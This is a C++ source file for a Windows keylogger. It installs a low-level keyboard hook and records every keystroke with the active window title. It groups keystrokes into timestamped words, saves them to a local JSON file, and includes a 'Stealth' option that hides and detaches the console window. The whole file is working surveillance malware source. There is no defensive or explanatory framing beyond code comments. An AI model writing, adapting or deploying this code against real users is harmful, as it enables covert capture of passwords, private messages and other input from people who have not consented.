#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <chrono>
#include "json.hpp" // Include the JSON library

// Use the nlohmann::json namespace
using json = nlohmann::json;

// Defines whether the window is visible or not
#define visible // (visible / invisible)
// Defines whether you want to enable or disable
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore

// Variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

// Define a global JSON object to store the keystrokes
json keystrokes_json = json::array();

// Buffer to store the current word
std::stringstream word_buffer;

// Global variable to store the last active window title
char lastwindow[256] = "";

// Function prototypes
int Save(int key_stroke);
void SaveWord();

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // save to file
            if (kbdStruct.vkCode == VK_SPACE || kbdStruct.vkCode == VK_RETURN)
            {
                SaveWord();
            }
            else
            {
                Save(kbdStruct.vkCode);
            }
        }
    }

    // call the next hook in the hook chain. This is necessary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}

int Save(int key_stroke)
{
    std::stringstream output;
#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2))
    {
        return 0; // ignore mouse clicks
    }
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    const std::map<int, std::string> keyname{
        {VK_BACK, "[BACKSPACE]"},
        {VK_RETURN, "\n"},
        {VK_SPACE, "_"},
        {VK_TAB, "[TAB]"},
        {VK_SHIFT, "[SHIFT]"},
        {VK_LSHIFT, "[LSHIFT]"},
        {VK_RSHIFT, "[RSHIFT]"},
        {VK_CONTROL, "[CONTROL]"},
        {VK_LCONTROL, "[LCONTROL]"},
        {VK_RCONTROL, "[RCONTROL]"},
        {VK_MENU, "[ALT]"},
        {VK_LWIN, "[LWIN]"},
        {VK_RWIN, "[RWIN]"},
        {VK_ESCAPE, "[ESCAPE]"},
        {VK_END, "[END]"},
        {VK_HOME, "[HOME]"},
        {VK_LEFT, "[LEFT]"},
        {VK_RIGHT, "[RIGHT]"},
        {VK_UP, "[UP]"},
        {VK_DOWN, "[DOWN]"},
        {VK_PRIOR, "[PG_UP]"},
        {VK_NEXT, "[PG_DOWN]"},
        {VK_OEM_PERIOD, "."},
        {VK_DECIMAL, "."},
        {VK_OEM_PLUS, "+"},
        {VK_OEM_MINUS, "-"},
        {VK_ADD, "+"},
        {VK_SUBTRACT, "-"},
        {VK_CAPITAL, "[CAPSLOCK]"},
    };

    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif

    // Add the keystroke to the buffer
    word_buffer << output.str();

    std::cout << output.str();

    return 0;
}

void SaveWord()
{
    std::string word = word_buffer.str();
    if (!word.empty())
    {
        // Get the current time
        auto now = std::chrono::system_clock::now();
        auto duration = now.time_since_epoch();
        auto millis = std::chrono::duration_cast<std::chrono::milliseconds>(duration).count();
        std::string timestamp = std::to_string(millis);

        // Add the word and timestamp to the JSON object
        keystrokes_json.push_back({
            {"window", lastwindow},
            {"word", word},
            {"timestamp", timestamp}
        });

        // Write the JSON object to a file
        std::ofstream json_file("keystrokes.json");
        json_file << keystrokes_json.dump(4); // Pretty print with 4 spaces indentation
        json_file.close();

        // Clear the buffer
        word_buffer.str("");
        word_buffer.clear();
    }
}

void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
    FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
#endif
}

int main()
{
    // Call the visibility of window function.
    Stealth();

    // Check if the system is still booting up
#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
    // while (IsSystemBooting())
    // {
    //     std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
    //     Sleep(10000); // Wait for 10 seconds before checking again
    // }
#endif
#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
    std::cout << "Skipping boot metrics check.\n";
#endif
    // This part of the program is reached once the system has
    // finished booting up aka when the while loop is broken
    // with the correct returned value.

    // Call the hook function and set the hook.
    SetHook();

    // We need a loop to keep the console application running.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}
